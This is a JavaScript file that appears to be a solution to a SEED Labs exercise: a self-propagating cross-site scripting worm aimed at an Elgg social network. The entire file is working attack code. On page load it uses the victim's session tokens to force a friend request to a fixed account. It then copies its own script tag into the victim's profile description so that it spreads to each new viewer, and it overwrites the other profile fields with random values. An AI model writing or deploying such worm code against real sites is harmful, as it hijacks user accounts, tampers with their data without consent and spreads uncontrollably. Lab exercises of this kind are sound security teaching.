function generateRandomString(length) {
    return Array.from({ length: length }, () => 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'[Math.floor(Math.random() * 62)]).join('');
}

window.onload = function(){
    if(elgg.session.user.guid && elgg.session.user.guid != 59 ){
        

        // add friend
        var Ajax=null;
        var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
        var token="&__elgg_token="+elgg.security.token.__elgg_token;
        //Construct the HTTP request to add Samy as a friend.

        var sendurl= 'http://www.seed-server.com/action/friends/add?friend=59' + ts +  token + ts + token

        console.log(sendurl)

        //Create and send Ajax request to add friend
        Ajax=new XMLHttpRequest();
        Ajax.open("GET",sendurl,true);
        Ajax.setRequestHeader("Host","www.seed-server.com");
        Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
        Ajax.send();



        var headerTag = "<script id=\"worm\" type=\"text/javascript\">";
        var jsCode = document.getElementById("worm").innerHTML;
        var tailTag = "</" + "script>";
        var wormCode = headerTag + jsCode + tailTag;


        let formData = new FormData();
        ts=elgg.security.token.__elgg_ts;
        token=elgg.security.token.__elgg_token;
        let username = elgg.session.user.name;
        let guid = elgg.session.user.guid;
        
        
        formData.append('__elgg_token', token);
        formData.append('__elgg_ts', ts);
        formData.append('name', username);
        formData.append('guid', guid);
    
        let fields = ['description', 'briefdescription', 'location', 'interests', 'skills', 'contactemail', 'phone', 'mobile', 'website', 'twitter'];
    
        for (let i = 0; i < fields.length; i++) {
            formData.append(fields[i], generateRandomString(10));
            formData.append(`accesslevel[${fields[i]}]`, 1);
        }
    
        formData.set('description', wormCode);
        formData.set('contactemail', generateRandomString(10) + '@gmail.com');
    
    
        var sendurl ="http://www.seed-server.com/action/profile/edit" 
    
    
        var Ajax=null;
        Ajax=new XMLHttpRequest();
        Ajax.open("POST",sendurl,true);
        Ajax.send(formData);
    }
}